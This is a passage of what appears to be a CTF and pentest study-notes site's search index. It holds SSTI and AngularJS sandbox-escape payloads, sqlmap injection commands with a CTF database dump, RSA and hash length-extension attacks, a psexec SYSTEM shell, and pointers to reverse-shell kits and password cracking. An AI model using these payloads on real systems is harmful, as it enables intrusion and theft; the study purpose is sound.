{{''[request.args.kaibro]}}&amp;kaibro=__class__ AngularJS v1.6\u5f8c\u79fb\u9664Sandbox Payload {{ 7*7 }} =&gt; 49 {{ this }} {{ this.toString() }} {{ constructor.toString() }} {{ constructor.constructor('alert(1)')() }} 2.1 v1.0.1-v1.1.5 {{ a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() }} 2.1 v1.0.1-v1.1.5 {{ toString.constructor.prototype.toString=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(toString.constructor) }} 2.3 v1.2.19-v1.2.23 {{'a'.constructor.prototype.charAt=''.valueOf;$eval(&quot;x='\\&quot;+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\&quot;'&quot;);}} v1.2.24-v1.2.29 {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}} v1.3.20 {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)\/\/');}} v1.4.0-v1.4.9 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}} v1.5.0-v1.5.8 {{ [].pop.constructor('alert(1)')() }} 2.8 v1.6.0-1.6.6 Vue.js {{constructor.constructor('alert(1)')()}} https:\/\/github.com\/dotboris\/vuejs-serverside-template-xss Python % \u8f38\u5165%(passowrd)s\u5373\u53ef\u5077\u5230\u5bc6\u78bc\uff1a userdata = {\"user\" : \"kaibro\", \"password\" : \"ggininder\" } passwd = raw_input(\"Password: \") if passwd != userdata[\"password\"]: print (\"Password \" + passwd + \" is wrong for user %(user)s\") % userdata f python 3.6 example a=&quot;gg&quot; b=f&quot;{a} ininder&quot; &gt;&gt;&gt; gg ininder example2 f&quot;{os.system('ls')}&quot; Tool https:\/\/github.com\/epinna\/tplmap http:\/\/blog.portswigger.net\/2015\/08\/server-side-template-injection.html","tags":"","url":"Web_Application_Attack\/SSTI_(Server_Side_Template_Injection).html"},{"title":"Tools-sqlmap","text":"SQLMap Table of Contents SQLMap tags: Security Web Tools Easy Usage \u76ee\u6a19\u9078\u9805 -u \u201cURL\u201d -d DBMS_IP -m SVR_LIST_FILE -c FILE.conf \u7db2\u9801\u8cc7\u6599\u9078\u9805 \u2013method={POST | GET} \u2013data \u201cField1=value1&amp;Field2=value2\u201d \u2013cookie \u201cid=1;user=abc\u201d \u8655\u7406\u901f\u5ea6\u9078\u9805 \u2013delay=DELAY \u2013timeout=TIMEOUT \u2013retries=RETRIES \u2013threads N \u96b1\u533f\u884c\u8e64\u9078\u9805 \u2013hpp \u731c\u89e3\u9078\u9805 -p \u201cID,ID2\u201d \u2013skip=\u201cid,name\u201d \u2013dbms \u201cDBMS-TYPE\u201d \u2013dbms-cred=\u201cID:PASSW\u201d \u5075\u6e2c\u8a2d\u5b9a \u2013level=N \u2013risk=N \u731c\u89e3\u76ee\u6a19 -b \u2013current-user \u2013current-db \u2013is-dba \u2013users \u2013passwords \u2013privileges \u2013roles \u2013dbs \u2013table \u2013dump-all \u6307\u5b9a\u76ee\u6a19 -D DB_NAME -T Table_NAME -C COLUMN_NAME -U USER_ID \u2013dump \u66b4\u529b\u731c\u89e3\u9078\u9805 \u5176\u4ed6\u9078\u9805 -v N \u2013batch write-up \u7b2c\u4e8c\u6b21 SQLmap tags: Security Web Tools sqlmap [OPTIONs] -u &quot;URL&quot; Easy Usage sqlmap -u &quot;http:\/\/demo.testfire.net&quot; --method=POST --data=&quot;user=admin&amp;pass=1234&quot; -c sqlmap.conf #\u5c07\u5404\u53c3\u6578\u5beb\u5728sqlmap.conf\u4e2d sqlmap -u &quot;http:\/\/demo.wildfoot.tw\/PAGE?id=1&quot; --referer &quot;http:\/\/www.google.com&quot; #\u4f7f\u7528referer\u5c07\u8acb\u6c42\u4f86\u539f\u6307\u5411google sqlmap -u &quot;http:\/\/login\/&quot; --auth-type=&quot;Basic&quot; --auth-cred=&quot;admin:adminpass&quot; #\u4f7f\u7528\u57fa\u672c\u8a8d\u8b49 \u76ee\u6a19\u9078\u9805 -u \u201cURL\u201d -d DBMS_IP -d &quot;mysql:\/\/admin:admin@192.168.21.17:3306\/testdb&quot; -d &quot;access:\/\/c:\/\/\/mydata\/myacces.mds&quot; -m SVR_LIST_FILE \u5f9e\u4f3a\u670d\u5668\u6e05\u55ae\u6a94\u6848\u4e2d\u9032\u884c\u5927\u91cf\u722c\u87f2\u4f5c\u696d -c FILE.conf \u5c07\u53c3\u6578\u5beb\u5728sqlmap.conf\u4e2d \u7db2\u9801\u8cc7\u6599\u9078\u9805 \u2013method={POST | GET} \u2013data \u201cField1=value1&amp;Field2=value2\u201d \u914d\u5408POST\u4f7f\u7528 \u2013cookie \u201cid=1;user=abc\u201d \u8655\u7406\u901f\u5ea6\u9078\u9805 \u2013delay=DELAY \u6bcf\u7d44Request\u66ab\u505cDELAY(seconds) \u2013timeout=TIMEOUT \u8a2d\u5b9a\u4f3a\u670d\u5668\u56de\u61c9\u903e\u6642\u6642\u9593(seconds)(default=30) \u2013retries=RETRIES \u4f3a\u670d\u5668\u903e\u6642\u91cd\u8a66\u6b21\u6578(default=3) \u2013threads N \u591a\u57f7\u884c\u7dd2(\u5efa\u8b708\u4ee5\u5167) \u96b1\u533f\u884c\u8e64\u9078\u9805 \u2013hpp \u50b3\u905e\u7684\u6383\u63cf\u8cc7\u6599\u53c3\u96dc\u975e\u6ef2\u900f\u7528\u8cc7\u6599 \u731c\u89e3\u9078\u9805 -p \u201cID,ID2\u201d \u5c0d\u6b04\u4f4dID,ID2\u9032\u884c\u6ce8\u5165 \u2013skip=\u201cid,name\u201d \u5c0d\u6b04\u4f4did,name\u4e0d\u9032\u884c\u6ce8\u5165 \u2013dbms \u201cDBMS-TYPE\u201d \u5df2\u77e5\u8cc7\u6599\u5eab\u7cfb\u7d71 Example : MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft_Access,SQLite,Firebird,Sybase,SAP MaxDB,DB2 \u2013dbms-cred=\u201cID:PASSW\u201d \u5df2\u77e5\u8cc7\u6599\u5eab\u4f7f\u7528\u8005\u5e33\u865f:\u5bc6\u78bc \u5075\u6e2c\u8a2d\u5b9a \u2013level=N \u5075\u67e5\u7a0b\u5ea6 1 (\u6dfa,\u5feb)~5 (\u6df1,\u6162) \u2013risk=N \u5075\u67e5\u6f0f\u6d1e\u7684\u98a8\u96aa\u7b49\u7d1a 0 (\u5c0f,\u5feb)~3 (\u5927,\u6162) (default=1) \u731c\u89e3\u76ee\u6a19 -b \u731c\u89e3DBMS\u8b58\u5225\u8cc7\u8a0a(banner) \u2013current-user \u731c\u89e3\u76ee\u524d\u8cc7\u6599\u5eab\u9023\u7dda\u7684\u4f7f\u7528\u8005\u540d\u7a31 \u2013current-db \u731c\u89e3\u76ee\u524d\u8cc7\u6599\u5eab \u2013is-dba \u731c\u89e3\u76ee\u524d\u4f7f\u7528\u8005\u662f\u5426\u70baDBMS\u7684\u7ba1\u7406\u54e1 \u2013users \u5217\u51fa\u6b64\u8cc7\u6599\u5eab\u7684\u6240\u6709\u4f7f\u7528\u8005\u5e33\u865f \u2013passwords \u5217\u51fa\u6b64\u8cc7\u6599\u5eab\u7684\u6240\u6709\u4f7f\u7528\u8005\u5bc6\u78bc\u7684\u96dc\u6e4a\u503c \u2013privileges \u5217\u51fa\u6b64\u8cc7\u6599\u5eab\u7684\u6240\u6709\u4f7f\u7528\u8005\u7684\u6b0a\u9650 \u2013roles \u5217\u51fa\u6b64\u8cc7\u6599\u5eab\u7684\u6240\u6709\u4f7f\u7528\u8005\u7684\u89d2\u8272 \u2013dbs \u5217\u51fa\u8cc7\u6599\u5eab\u7cfb\u7d71\u4e0a\u6709\u54ea\u4e9b\u8cc7\u6599\u5eab \u2013table \u5217\u51fa\u6709\u54ea\u4e9b\u8cc7\u6599\u8868 \u2013dump-all \u731c\u89e3\u6240\u6709\u8cc7\u6599\u5eab\u5167\u7684\u6240\u6709\u8868\u683c(\u4e0d\u5efa\u8b70\u4f7f\u7528XD) \u6307\u5b9a\u76ee\u6a19 -D DB_NAME \u6307\u5b9a\u731c\u89e3\u7684\u5c0d\u8c61\u8cc7\u6599\u5eab -T Table_NAME \u6307\u5b9a\u731c\u89e3\u7684\u5c0d\u8c61\u8cc7\u6599\u8868 -C COLUMN_NAME \u6307\u5b9a\u731c\u89e3\u7684\u5c0d\u8c61\u6b04\u4f4d -U USER_ID \u6307\u5b9a\u731c\u89e3\u7684\u5c0d\u8c61\u8cc7\u6599\u5eab\u4f7f\u7528\u8005 \u2013dump \u50be\u5370\u51fa \u8cc7\u6599\u5eab\u4e2d\u7684\u6240\u6709\u8cc7\u6599\u8868\u4e2d\u7684\u6240\u6709\u8cc7\u6599(-D) \u7279\u5b9a\u8cc7\u6599\u8868\u4e2d\u7684\u6240\u6709\u8cc7\u6599(-D -T) \u66b4\u529b\u731c\u89e3\u9078\u9805 \u2013common-tables \u5229\u7528\u5167\u5efa\u5b57\u5178\u6a94\u731c\u89e3\u53ef\u80fd\u7684\u8cc7\u6599\u8868 \u2013common-columns \u5229\u7528\u5167\u5efa\u5b57\u5178\u6a94\u731c\u89e3\u53ef\u80fd\u7684\u8cc7\u6599\u6b04\u4f4d \u5176\u4ed6\u9078\u9805 -v N \u6383\u63cf\u904e\u7a0b\u4e2d\u7684\u8cc7\u8a0a\u8a73\u7d30\u7a0b\u5ea6 1 (\u7c21\u6f54) ~ 6(\u8a73\u7d30) \u2013batch \u5728\u57f7\u884c\u904e\u7a0b\u4e2d \u82e5\u9700\u8981\u4f7f\u7528\u8005\u8f38\u5165\u8cc7\u8a0a \u4e00\u5f8b\u4f7f\u7528\u9810\u8a2d\u503c write-up python sqlmap.py --level=5 --risk=3 #\u6700\u8a73\u7d30\u57f7\u884c --dbms=&quot;MySQL&quot; #\u4e4b\u524d\u7684\u8abf\u67e5\u5df2\u7d93\u767c\u73fe\u662fMySQL -p &quot;user,password&quot; #\u8981\u6e2c\u8a66\u6709\u6c92\u6709\u6f0f\u6d1e\u7684\u6b04\u4f4d --method=POST --data=&quot;user=Wildfoot&amp;password=Wildfoot&quot; #\u7528POST \u7136\u5f8c\u6b04\u4f4d\u9810\u8a2d\u7684\u503c -u &quot;https:\/\/hackme.inndy.tw\/gb\/?mod=del&amp;pid=4&quot; -v 6 #\u6700\u8a73\u7d30\u7684\u57f7\u884c\u756b\u9762 --user-agent=&quot;Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko\/20100101 Firefox\/49.0&quot; Parameter: user (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (NOT) Payload: user=Wildfoot' OR NOT 8219=8219-- ZGiV&amp;password=Wildfoot Vector: OR NOT [INFERENCE] Type: AND\/OR time-based blind Title: MySQL &gt;= 5.0.12 OR time-based blind Payload: user=Wildfoot' OR SLEEP(5)-- HQoJ&amp;password=Wildfoot Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]) --- web server operating system: Linux Ubuntu web application technology: Nginx back-end DBMS: MySQL &gt;= 5.0.0 Database: guestbook [3 tables] +---------------------------------------+ | flag | | posts | | users | +---------------------------------------+ Database: information_schema [61 tables] +---------------------------------------+ | CHARACTER_SETS | | COLLATIONS | | COLLATION_CHARACTER_SET_APPLICABILITY | | COLUMNS | | COLUMN_PRIVILEGES | | ENGINES | | EVENTS | | FILES | | GLOBAL_STATUS | | GLOBAL_VARIABLES | | INNODB_BUFFER_PAGE | | INNODB_BUFFER_PAGE_LRU | | INNODB_BUFFER_POOL_STATS | | INNODB_CMP | | INNODB_CMPMEM | | INNODB_CMPMEM_RESET | | INNODB_CMP_PER_INDEX | | INNODB_CMP_PER_INDEX_RESET | | INNODB_CMP_RESET | | INNODB_FT_BEING_DELETED | | INNODB_FT_CONFIG | | INNODB_FT_DEFAULT_STOPWORD | | INNODB_FT_DELETED | | INNODB_FT_INDEX_CACHE | | INNODB_FT_INDEX_TABLE | | INNODB_LOCKS | | INNODB_LOCK_WAITS | | INNODB_METRICS | | INNODB_SYS_COLUMNS | | INNODB_SYS_DATAFILES | | INNODB_SYS_FIELDS | | INNODB_SYS_FOREIGN | | INNODB_SYS_FOREIGN_COLS | | INNODB_SYS_INDEXES | | INNODB_SYS_TABLES | | INNODB_SYS_TABLESPACES | | INNODB_SYS_TABLESTATS | | INNODB_SYS_VIRTUAL | | INNODB_TEMP_TABLE_INFO | | INNODB_TRX | | KEY_COLUMN_USAGE | | OPTIMIZER_TRACE | | PARAMETERS | | PARTITIONS | | PLUGINS | | PROCESSLIST | | PROFILING | | REFERENTIAL_CONSTRAINTS | | ROUTINES | | SCHEMATA | | SCHEMA_PRIVILEGES | | SESSION_STATUS | | SESSION_VARIABLES | | STATISTICS | | TABLES | | TABLESPACES | | TABLE_CONSTRAINTS | | TABLE_PRIVILEGES | | TRIGGERS | | USER_PRIVILEGES | | VIEWS | +---------------------------------------+ \u7b2c\u4e8c\u6b21 python sqlmap.py --dbms=&quot;MySQL&quot; --user-agent=&quot;Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko\/20100101 Firefox\/49.0&quot; -u &quot;https:\/\/hackme.inndy.tw\/gb\/?mod=del&amp;pid=4&quot; -v 6 --data=&quot;user=Wildfoot&amp;password=Wildfoot&quot; --dump -D guestbook -T flag #dump\u51fa guestbook.flag\u7406\u9762\u7684\u8cc7\u6599 --batch sqlmap resumed the following injection point(s) from stored session: --- Parameter: user (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (NOT) Payload: user=Wildfoot' OR NOT 8219=8219-- ZGiV&amp;password=Wildfoot Vector: OR NOT [INFERENCE] Type: AND\/OR time-based blind Title: MySQL &gt;= 5.0.12 OR time-based blind Payload: user=Wildfoot' OR SLEEP(5)-- HQoJ&amp;password=Wildfoot Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]) --- web server operating system: Linux Ubuntu web application technology: Nginx back-end DBMS: MySQL &gt;= 5.0.0 sqlmap resumed the following injection point(s) from stored session: --- Parameter: user (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (NOT) Payload: user=Wildfoot' OR NOT 8219=8219-- ZGiV&amp;password=Wildfoot Vector: OR NOT [INFERENCE] Type: AND\/OR time-based blind Title: MySQL &gt;= 5.0.12 OR time-based blind Payload: user=Wildfoot' OR SLEEP(5)-- HQoJ&amp;password=Wildfoot Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]) --- web server operating system: Linux Ubuntu web application technology: Nginx back-end DBMS: MySQL &gt;= 5.0.0 Database: guestbook Table: flag [3 entries] +----+----------------------------------------------------+----------+----------+ | id | flag | padding1 | padding0 | +----+----------------------------------------------------+----------+----------+ | 1 | http:\/\/i.giphy.com\/3o72FdPiRXBRbBLUc0.gif | 31415926 | 1337 | | 2 | FLAG{Y0U_KN0W_SQL_1NJECT10N!!!' or 595342&gt;123123#} | 88 | 77 | | 3 | http:\/\/i.giphy.com\/m7BTtLWhjkEJa.gif | 9999 | 6666 | +----+----------------------------------------------------+----------+----------+ SQLmap https:\/\/github.com\/sqlmapproject\/sqlmap\/wiki\/Usage Usage python sqlmap.py -u 'test.kaibro.tw\/a.php?id=1' \u5eab\u540d: --dbs \u8868\u540d: -D dbname --tables column: -D dbname -T tbname --columns dump: -D dbname -T tbname --dump --start=1 --stop=5566 DBA? --is-dba \u7206\u5e33\u5bc6: --passwords \u770b\u6b0a\u9650: --privileges \u62ffshell: --os-shell interative SQL: --sql-shell \u8b80\u6a94: --file-read=\/etc\/passwd Delay\u6642\u9593: --time-sec=10 User-Agent: --random-agent Thread: --threads=10 Level: --level=3 default: 1 --technique default: BEUSTQ Cookie: --cookie=&quot;abc=55667788&quot; Tor: --tor --check-tor --tor-type=SOCKS5 --tor-port=9050","tags":"","url":"Web_Application_Attack\/Tools_sqlmap.html"},{"title":"Tools-Burp Suite","text":"","tags":"","url":"Web_Application_Attack\/Tools_Burp_Suite.html"},{"title":"Misc","text":"","tags":"","url":"Crypto\/Misc.html"},{"title":"Classical Cipher","text":"Classical Cipher Table of Contents Classical Cipher tags: Security Crypto Caesar cipher Substitution cipher Transposition cipher Scytale cipher tags: Security Crypto Caesar cipher command : tr echo 'Funny{MyfirstCTF}' | tr xyza-w a-z echo 'Fxqqb{MbiluvwCTF}' | tr a-z xyza-w brute force : https:\/\/planetcalc.com\/1434\/ Substitution cipher online tool : quip quip Transposition cipher Rail fence cipher online tool : http:\/\/web.archive.org\/web\/20071104114600\/http:\/\/www.simonsingh.net\/The_Black_Chamber\/railfence.html Scytale cipher online tool : https:\/\/www.dcode.fr\/scytale-cipher command : fold echo -n &quot;ERTKSOOTCMCHYRAFYLIPL&quot; | fold -w3","tags":"","url":"Crypto\/Classical_Cipher.html"},{"title":"Symmetric Encryption","text":"Symmetric Encryption Table of Contents Symmetric Encryption tags: Security Crypto Xor cipher DES Triple DES AES tags: Security Crypto Xor cipher xortool : https:\/\/github.com\/hellman\/xortool most frequent byte: * binary 00 * text 20(space)https:\/\/zh.wikipedia.org\/wiki\/ASCII DES using ssl openssl enc \u2013h \u5217\u51fa OpenSSL \u63d0\u4f9b\u7684\u5c0d\u7a31\u5f0f\u52a0\u89e3\u5bc6\u6f14\u7b97\u6cd5 openssl des -in file -out file.des \u4f7f\u7528 DES \u52a0\u5bc6 openssl des -d -in file.des -out file \u4f7f\u7528 DES \u89e3\u5bc6 Triple DES AES Padding oracle attack \u4f3a\u670d\u5668\u80fd\u5e6b\u6211\u5011\u89e3\u5bc6\u4efb\u610f\u8a0a\u606f \u4f46\u6211\u5011\u53ea\u80fd\u77e5\u9053\u6709\u6c92\u6709 padding \u932f\u8aa4","tags":"","url":"Crypto\/Symmetric_Encryption.html"},{"title":"Asymmetric Cryptography","text":"Asymmetric Cryptography Table of Contents Asymmetric Cryptography tags: Security Crypto RSA \u55ae\u7d14\u5206\u89e3 N Twin Prime common factor attack \u52a0\u5bc6\u6307\u6578\u653b\u64ca - Hastad\u2019s Broadcast Attack \u6a21\u6578\u653b\u64ca - common modulus attack tags: Security Crypto RSA \u9078\u5169\u500b\u8cea\u6578 (p \u548c q) N = p * q \u03d5(n) = (p-1) * (q-1) \u9078\u52a0\u5bc6\u6307\u6578 e \u7b97\u89e3\u5bc6\u6307\u6578 d e*d \u2261 1 (mod \u03d5(n)) from Crypto.Util.number import inverse inverse(e, phi) \u516c\u9470 = (N, e) \u79c1\u9470 = d \u52a0\u5bc6 E(m) = m^e mod n c = pow(m, e, n) \u89e3\u5bc6 D(c) = c^d mod n m = pow(c, d, n) interger &lt;=&gt; string from Crypto.Util.number import bytes_to_long, long_to_bytes c = bytes_to_long(open(&quot;.\/flag.enc&quot;, &quot;rb&quot;).read()) decrypt = long_to_bytes(m) \u7528openssl\u770b\u91d1\u9470 openssl rsa -pubin -in pubkey.txt -text -modulus n = modulus \u7528python\u8b80\u91d1\u9470 from Crypto.PublicKey import RSA key = RSA.importKey(open(&quot;pubkey.txt&quot;, &quot;rb&quot;).read()) key.n key.e \u55ae\u7d14\u5206\u89e3 N online database : factordb.com from Crypto.Util.number import inverse, bytes_to_long, long_to_bytes n = 66473473500165594946611690873482355823120606837537154371392262259669981906291 p = 800644567978575682363895000391634967 q = 83024947846700869393771322159348359271173 e = 65537 phi = (p - 1) * (q - 1) c = bytes_to_long(open(&quot;.\/flag.enc&quot;, &quot;rb&quot;).read()) d = inverse(e, phi) m = pow(c, d, n) decrypt = long_to_bytes(m) print(decrypt) \u5c0f\u6280\u5de7 qiwi CTF iRoot.txt M^e mod N = C M = 2 e = 3 N = 100 \u5982\u679c M^e \u5c0f\u65bc N =&gt; C\u958be\u6b21\u65b9\u6839\u7b49\u65bcM Twin Prime \u5b9a\u7fa9:\u5169\u500b\u516c\u9470\u5206\u5225\u70ba n1 = p*q n2 = (p+2)*(q+2) \u516c\u5f0f p+q = (n2 - n1 - 4)\/2 n1_phi = n1 - (p + q) + 1 n2_phi = n1 + (p + q) + 1 common factor attack \u52a0\u5bc6\u6307\u6578\u653b\u64ca - Hastad\u2019s Broadcast Attack \u6a21\u6578\u653b\u64ca - common modulus attack from Crypto.Util.number import inverse, bytes_to_long, long_to_bytes # C1 = m^e1 mod n # C2 = m^e2 mod n # gcd(e1, e2) = 1 # e1*s1+e2*s2 = 1 # C1^s1 * C2^s2 = m mod n def xgcd(b, n): x0, x1, y0, y1 = 1, 0, 0, 1 while n != 0: q, b, n = b \/\/ n, n, b % n x0, x1 = x1, x0 - q * x1 y0, y1 = y1, y0 - q * y1 return b, x0, y0 def common_modulus_attack(c1, c2, e1, e2, n): _, s1, s2 = xgcd(e1, e2) if s1 &lt; 0: s1 = -s1 c1 = inverse(c1, n) if s2 &lt; 0: s2 = -s2 c2 = inverse(c2, n) c1s1 = pow(c1, s1, n) c2s2 = pow(c2, s2, n) m = (c1s1 * c2s2) % n return m","tags":"","url":"Crypto\/Asymmetric_Cryptography.html"},{"title":"Hash","text":"Hash Table of Contents Hash tags: Security Crypto Rainbow Table SHA1 collision MD5 Collision Length Extension Attack tags: Security Crypto Rainbow Table SHA1 collision MD5 Collision Length Extension Attack https:\/\/www.youtube.com\/watch?v=sawkPgsQPwg using tool : HashPump https:\/\/github.com\/bwall\/HashPump #your token: user=someone #your authentication code: 9863bb3cecccfdb82f689e2ddbdcd9c7ea3c069eb73a730d149c3aae2d60b7c0 #input your token: hashpump -s &quot;9863bb3cecccfdb82f689e2ddbdcd9c7ea3c069eb73a730d149c3aae2d60b7c0&quot; --data &quot;user=someone&quot; -a &quot;user=admin&quot; -k 44 #-k key\u9577\u5ea6\u901a\u5e38\u7531\u539f\u59cb\u78bc\u5f97\u5230 #-a \u60f3\u8981append\u7684\u5b57\u4e32 e43ae12ce0024abef5a376eebfc2ac7fc5a73d6be3a4b871f203f53e12191b5c user=someone\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\xc0user=admin \u4e0d\u7528pwntools \u7c21\u55ae\u9001 payload (python3 -c &quot;import sys; sys.stdout.buffer.write(b'user=someone\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\xc0user=admin\\ne43ae12ce0024abef5a376eebfc2ac7fc5a73d6be3a4b871f203f53e12191b5c\\n')&quot;; cat) | nc oalieno.com.tw 9999","tags":"","url":"Crypto\/Hash.html"},{"title":"Misc","text":"","tags":"","url":"Digital_Forensics\/Misc.html"},{"title":"Mobile Forensics","text":"","tags":"","url":"Digital_Forensics\/Mobile_Forensics.html"},{"title":"Misc","text":"","tags":"","url":"Smart_Contract\/Misc.html"},{"title":"Misc","text":"","tags":"","url":"Attack_And_Defense\/Misc.html"},{"title":"Misc Pentesting Tools","text":"Misc Pentesting Tools Table of Contents Misc Pentesting Tools tags: Security Tools collection Misc impacket impacket-psexec seclists Laudanum Microsoft nishang PowerSploit Others Responder\/MultiRelay tags: Security Tools collection Misc impacket Impacket is a collection of Python classes for working with network protocols. impacket-psexec Get system shell python3 psexec.py Administrator@bastion.htb Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation Password: [*] Requesting shares on bastion.htb..... [*] Found writable share ADMIN$ [*] Uploading file hoQpxzMA.exe [*] Opening SVCManager on bastion.htb..... [*] Creating service qdbo on bastion.htb..... [*] Starting service qdbo..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami nt authority\\system seclists List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more \/usr\/share\/seclists Discovery IOCs Passwords Payloads Usernames Fuzzing Miscellaneous Pattern-Matching README.md Web-Shells Laudanum Laudanum is a collection of injectable files \/usr\/share\/laudanum asp aspx cfm helpers jsp php README wordpress php - reverse shell \/usr\/share\/laudanum\/php\/php-reverse-shell.php Microsoft nishang Offensive PowerShell for red team, penetration testing and offensive security. GitHub \/usr\/share\/nishang\/ ActiveDirectory Bypass Execution MITM powerpreter Shells Antak-WebShell Client Gather nishang.psm1 Prasadhak Utility Backdoors Escalation Misc Pivot Scan reverse shell PowerSploit PowerSploit - A PowerShell Post-Exploitation Framework \/usr\/share\/windows-resources\/powersploit * this version is too old AntivirusBypass Mayhem PowerSploit.psm1 Recon CodeExecution Persistence Privesc ScriptModification Exfiltration PowerSploit.psd1 README.md Tests Others Responder\/MultiRelay GitHub - lgandx Responder an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http:\/\/support.microsoft.com\/kb\/163409). responder -I tun0 Get Full hashes in Responder locate Responder.db sqlite3 \/usr\/share\/responder\/Responder.db sqlite&gt; select * from responder;","tags":"","url":"Misc_Tools\/Misc_Pentesting_Tools.html"},{"title":"File Analyze Tools","text":"File Analyze Tools Table of Contents File Analyze Tools tags: Security Tools Reference Tools General xxd binwalk Compressed File pkcrack image stegsolve exiftool Microsoft oletools Tools to analyze malicious documents Tools to analyze the structure of OLE files virtual machine vhd (Virtual Hard Disk) zip file pkcrack fcrackzip tags: Security Tools Reference GitHub - zardus Tools General xxd 0000000: 2e54 4820 5858 4420 3120 224d .TH XXD 1 &quot;M 000000c: 616e 7561 6c20 7061 6765 2066 anual page f 0000018: 6f72 2078 7864 220a 2e5c 220a or xxd&quot;..\\&quot;. 0000024: 2e5c 2220 3231 7374 204d 6179 .\\&quot; 21st May 0000030: 2031 3939 360a 2e5c 2220 4d61 1996..\\&quot; Ma 000003c: 6e20 7061 6765 2061 7574 686f n page autho 0000048: 723a 0a2e 5c22 2020 2020 546f r:..\\&quot; To 0000054: 6e79 204e 7567 656e 7420 3c74 ny Nugent &lt;t 0000060: 6f6e 7940 7363 746e 7567 656e ony@sctnugen 000006c: 2e70 7070 2e67 752e 6564 752e .ppp.gu.edu. binwalk \u5f9ebinary\u5206\u6790\u6a94\u6848(png + rar\u7b49\u7b49) Compressed File pkcrack \u5df2\u77e5\u660e\u6587zip\u653b\u64ca image stegsolve \u5716\u7247\u5404\u7a2e\u72c0\u614b wget http:\/\/www.caesum.com\/handbook\/Stegsolve.jar -O stegsolve.jar chmod +x stegsolve.jar apt-get install openjdk-8-jre java -jar stegsolve.jar java -version \/\/openjdk version &quot;1.8.0_131&quot; \/\/OpenJDK Runtime Environment (build 1.8.0_131-8u131-b11-0ubuntu1.16.04.2-b11) \/\/OpenJDK 64-Bit Server VM (build 25.131-b11, mixed mode) exiftool apt-get install libimage-exiftool-perl exiftool example.png Microsoft oletools GitHub python3 -m pip install oletools Tools to analyze malicious documents oleid: to analyze OLE files to detect specific characteristics usually found in malicious files. olevba: to extract and analyze VBA Macro source code from MS Office documents (OLE and OpenXML). MacroRaptor: to detect malicious VBA Macros msodde: to detect and extract DDE\/DDEAUTO links from MS Office documents, RTF and CSV pyxswf: to detect, extract and analyze Flash objects (SWF) that may be embedded in files such as MS Office documents (e.g. Word, Excel) and RTF, which is especially useful for malware analysis. oleobj: to extract embedded objects from OLE files. rtfobj: to extract embedded objects from RTF files. Tools to analyze the structure of OLE files olebrowse: A simple GUI to browse OLE files (e.g. MS Word, Excel, Powerpoint documents), to view and extract individual data streams. olemeta: to extract all standard properties (metadata) from OLE files. oletimes: to extract creation and modification timestamps of all streams and storages. oledir: to display all the directory entries of an OLE file, including free and orphaned entries. olemap: to display a map of all the sectors in an OLE file. virtual machine vhd (Virtual Hard Disk) 7z 7z l .\/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd guestmount apt install libguestfs-tools guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v \/mnt\/vhd zip file pkcrack fcrackzip fcrackzip -D -p \/usr\/share\/wordlists\/rockyou.txt backup.zip","tags":"","url":"Misc_Tools\/File_Analyze_Tools.html"},{"title":"Vulnerable Target Machine","text":"Vulnerable Target Machine Table of Contents Vulnerable Target Machine tags: Security Metasploitable 2 WebGoat bWAPP\/bee-box Capture The Flag Crypto tags: Security Metasploitable 2 include Mutillidae, DVWA WebGoat bWAPP\/bee-box Capture The Flag CTF Training Docker Crypto cryptopals.com","tags":"","url":"Misc_Tools\/Vulnerable_Target_Machine.html"},{"title":"Tools-Metasploit","text":"Metasploit Table of Contents Metasploit tags: Security Tools Reference Msfconsole modules Auxiliary Exploits MSFVenom cheatsheet overview EXITFUNC Useful Payload Payload staged\/non-staged example: using staged payload test payload Meterpreter Online Resources Commands execute tags: Security Tools Reference Using exploits Msfconsole msf&gt; search snmp msf&gt; use exploit\/...\/...\/... msf&gt; info msf&gt; show options msf&gt; set RHOST 192.168... msf&gt; set 